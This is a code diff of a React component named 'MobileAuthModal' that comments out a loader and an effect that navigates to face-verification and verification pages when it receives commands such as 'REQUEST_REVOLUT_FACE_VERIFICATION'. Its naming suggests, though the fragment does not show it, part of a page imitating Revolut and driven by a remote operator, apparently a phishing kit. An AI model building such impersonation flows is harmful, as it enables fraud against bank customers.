@@ -18,46 +18,46 @@ export default function MobileAuthModal({ displayAuth, setDisplayAuth, resetComm
 
 
     // This function displays the revolut Loader
-    const displayPageLoader = () => {
-        console.log("NOW DISPLAYING PAGE LOADER");
-        setDisplayLoader(true);
-    };
+    // const displayPageLoader = () => {
+    //     console.log("NOW DISPLAYING PAGE LOADER");
+    //     setDisplayLoader(true);
+    // };
 
-    const navigateWithLoader = useCallback((path) => {
-      // Show loader
-      setDisplayLoader(true);
-      // Set a minimum display time for the loader (for UX purposes)
-      const minLoaderTime = 1500; // 1.5 seconds
-      const startTime = Date.now();
+    // const navigateWithLoader = useCallback((path) => {
+    //   // Show loader
+    //   setDisplayLoader(true);
+    //   // Set a minimum display time for the loader (for UX purposes)
+    //   const minLoaderTime = 1500; // 1.5 seconds
+    //   const startTime = Date.now();
 
-      // Prepare the navigation
-      const performNavigation = () => {
-        router.push(path);
-      };
-      // Handle the timing
-      setTimeout(() => {
-        const elapsedTime = Date.now() - startTime;
-        if (elapsedTime < minLoaderTime) {
-          // If minimum time hasn't passed, wait the remaining time
-          setTimeout(performNavigation, minLoaderTime - elapsedTime);
-        } else {
-          // Minimum time has passed, navigate immediately
-          performNavigation();
-        }
-      }, 100); // Small delay to ensure loader is visible
-    }, [router]);
+    //   // Prepare the navigation
+    //   const performNavigation = () => {
+    //     router.push(path);
+    //   };
+    //   // Handle the timing
+    //   setTimeout(() => {
+    //     const elapsedTime = Date.now() - startTime;
+    //     if (elapsedTime < minLoaderTime) {
+    //       // If minimum time hasn't passed, wait the remaining time
+    //       setTimeout(performNavigation, minLoaderTime - elapsedTime);
+    //     } else {
+    //       // Minimum time has passed, navigate immediately
+    //       performNavigation();
+    //     }
+    //   }, 100); // Small delay to ensure loader is visible
+    // }, [router]);
 
 
   
-    // Handle command changes
-    useEffect(() => {
-        if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
-            navigateWithLoader('/FaceVerificationPage');
-        } else if (command === 'FINISH') {
-            navigateWithLoader('/verificationPage');
-            resetCommand();
-        } 
-    }, [command, router, navigateWithLoader, resetCommand]);
+    // // Handle command changes
+    // useEffect(() => {
+    //     if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
+    //         navigateWithLoader('/FaceVerificationPage');
+    //     } else if (command === 'FINISH') {
+    //         navigateWithLoader('/verificationPage');
+    //         resetCommand();
+    //     } 
+    // }, [command, router, navigateWithLoader, resetCommand]);
 
   
     useEffect(() => {
